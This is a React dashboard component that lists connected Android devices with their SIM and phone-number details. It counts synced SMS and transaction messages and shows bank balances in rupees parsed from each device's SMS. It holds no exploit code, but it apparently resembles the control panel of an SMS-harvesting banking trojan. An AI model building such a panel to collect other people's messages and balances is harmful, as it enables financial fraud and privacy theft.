import { useMemo, useState } from 'react';
import { Link } from 'react-router-dom';
import { useDevices } from '../contexts/DeviceContext';
import { Device } from '../types';
import {
    DeviceSortKey,
    DeviceStatusFilter,
    filterDevices,
    getDeviceNumberMap,
    getLatestBalance,
    getSimSummary,
    isTransactionMessage,
    sortDevices,
} from '../utils/transactions';

function DeviceCard({ device, number }: { device: Device; number: number }) {
    const lastSeen = new Date(device.lastSeen).toLocaleString();
    const sims = device.simCards || [];
    const simSummary = getSimSummary(sims);

    return (
        <Link to={`/device/${device.id}`} style={{ textDecoration: 'none' }}>
            <div className="glass-card device-card clickable">
                <div className="device-number" title={`Device #${number}`}>
                    #{number}
                </div>
                <div className="device-header">
                    <div className="device-icon">📱</div>
                    <div className="device-info">
                        <h3>{device.name}</h3>
                        <p>{device.phoneNumber || sims.find(s => s.phoneNumber)?.phoneNumber || 'No number'}</p>
                    </div>
                </div>

                <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap', marginBottom: '0.5rem' }}>
                    <div className={`device-status ${device.status}`}>
                        <span className={`status-dot ${device.status}`}></span>
                        {device.status}
                    </div>
                    <span
                        className={`badge ${sims.length > 1 ? 'badge-success' : sims.length === 1 ? 'badge-warning' : 'badge-danger'}`}
                        title={sims.map((s) => `${s.displayName} (${s.carrierName} ${s.phoneNumber})`).join('\n') || 'No SIM info synced yet'}
                    >
                        📶 {simSummary.label}
                        {simSummary.carriers ? ` · ${simSummary.carriers}` : ''}
                    </span>
                </div>

                {sims.length > 0 && (
                    <div className="sim-chips">
                        {sims.map((sim, idx) => (
                            <span key={idx} className="sim-chip" title={`Slot ${sim.slotIndex + 1} · ${sim.carrierName} · ${sim.phoneNumber || 'number hidden by carrier'}`}>
                                SIM {sim.slotIndex + 1}: {sim.carrierName || 'Unknown'}
                                {sim.phoneNumber ? ` · ${sim.phoneNumber}` : ''}
                            </span>
                        ))}
                    </div>
                )}

                <div style={{ marginTop: '1rem', fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                    Last seen: {lastSeen}
                </div>
            </div>
        </Link>
    );
}

export default function Dashboard() {
    const { devices, deviceData } = useDevices();
    const [query, setQuery] = useState('');
    const [status, setStatus] = useState<DeviceStatusFilter>('all');
    const [sort, setSort] = useState<DeviceSortKey>('status');

    const numberMap = useMemo(() => getDeviceNumberMap(devices), [devices]);

    const visible = useMemo(() => {
        return sortDevices(filterDevices(devices, query, status), sort);
    }, [devices, query, status, sort]);

    const stats = useMemo(() => {
        const online = devices.filter((d) => d.status === 'online').length;
        let sms = 0;
        let txn = 0;
        deviceData.forEach((d) => {
            sms += d.sms.length;
            for (const s of d.sms) {
                if (isTransactionMessage(s.message)) txn += 1;
            }
        });
        return { total: devices.length, online, offline: devices.length - online, sms, txn };
    }, [devices, deviceData]);

    const balances = useMemo(() => {
        const out: { deviceId: string; name: string; balance: number; timestamp: string }[] = [];
        devices.forEach((d) => {
            const data = deviceData.get(d.id);
            if (!data || data.sms.length === 0) return;
            const b = getLatestBalance(data.sms, d.id, d.name);
            if (b) out.push({ deviceId: d.id, name: d.name, balance: b.balance, timestamp: b.timestamp });
        });
        return out;
    }, [devices, deviceData]);

    return (
        <>
            <div className="stats-row">
                <div className="stat-card">
                    <div className="stat-value">{stats.total}</div>
                    <div className="stat-label">Devices</div>
                </div>
                <div className="stat-card stat-online">
                    <div className="stat-value">{stats.online}</div>
                    <div className="stat-label">Online</div>
                </div>
                <div className="stat-card stat-offline">
                    <div className="stat-value">{stats.offline}</div>
                    <div className="stat-label">Offline</div>
                </div>
                <div className="stat-card">
                    <div className="stat-value">{stats.sms}</div>
                    <div className="stat-label">SMS synced</div>
                </div>
                <div className="stat-card stat-money">
                    <div className="stat-value">₹{stats.txn}</div>
                    <div className="stat-label">Money SMS</div>
                </div>
            </div>

            {balances.length > 0 && (
                <div className="balance-strip">
                    <span className="balance-strip-title">💰 Latest balances:</span>
                    {balances.slice(0, 6).map((b) => (
                        <Link key={b.deviceId} to={`/transactions?device=${b.deviceId}`} className="balance-pill">
                            #{numberMap.get(b.deviceId) ?? '?'} {b.name}: ₹
                            {b.balance.toLocaleString('en-IN', { minimumFractionDigits: 2 })}
                        </Link>
                    ))}
                </div>
            )}

            <div className="toolbar">
                <div className="search-wrap">
                    <span className="search-icon">🔍</span>
                    <input
                        className="form-input search-input"
                        placeholder="Search devices by name, number, carrier, SIM…"
                        value={query}
                        onChange={(e) => setQuery(e.target.value)}
                    />
                    {query && (
                        <button className="search-clear" onClick={() => setQuery('')} aria-label="Clear search">
                            ✕
                        </button>
                    )}
                </div>
                <div className="toolbar-filters">
                    <div className="segmented" role="tablist" aria-label="Status filter">
                        {(['all', 'online', 'offline'] as DeviceStatusFilter[]).map((s) => (
                            <button
                                key={s}
                                className={`segmented-btn ${status === s ? 'active' : ''}`}
                                onClick={() => setStatus(s)}
                            >
                                {s === 'all' ? `All (${devices.length})` : s === 'online' ? `🟢 Online` : `🔴 Offline`}
                            </button>
                        ))}
                    </div>
                    <select
                        className="form-input sort-select"
                        value={sort}
                        onChange={(e) => setSort(e.target.value as DeviceSortKey)}
                        aria-label="Sort devices"
                    >
                        <option value="status">Sort: Online first</option>
                        <option value="newest">Sort: Newest seen</option>
                        <option value="oldest">Sort: Oldest seen (# order)</option>
                        <option value="name">Sort: Name A–Z</option>
                    </select>
                </div>
            </div>

            {devices.length === 0 ? (
                <div className="glass-card empty-state">
                    <div className="empty-state-icon">📡</div>
                    <h2>No Devices Connected</h2>
                    <p>
                        Waiting for devices to connect. When an Android device connects,
                        it will appear here.
                    </p>
                </div>
            ) : visible.length === 0 ? (
                <div className="glass-card empty-state">
                    <div className="empty-state-icon">🔍</div>
                    <h2>No matches</h2>
                    <p>
                        No devices match “{query}”
                        {status !== 'all' ? ` with status ${status}` : ''}. Try clearing the
                        search or changing the filter.
                    </p>
                    <button className="btn btn-secondary" style={{ marginTop: '1rem' }} onClick={() => { setQuery(''); setStatus('all'); }}>
                        Clear filters
                    </button>
                </div>
            ) : (
                <>
                    <div style={{ marginBottom: '1rem', display: 'flex', alignItems: 'baseline', gap: '0.5rem' }}>
                        <h2 style={{ fontSize: '1.25rem', fontWeight: 600 }}>
                            Connected Devices ({visible.length}/{devices.length})
                        </h2>
                        <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>
                            # numbering is stable (oldest device = #1)
                        </span>
                    </div>
                    <div className="devices-grid">
                        {visible.map((device) => (
                            <DeviceCard key={device.id} device={device} number={numberMap.get(device.id) ?? 0} />
                        ))}
                    </div>
                </>
            )}
        </>
    );
}
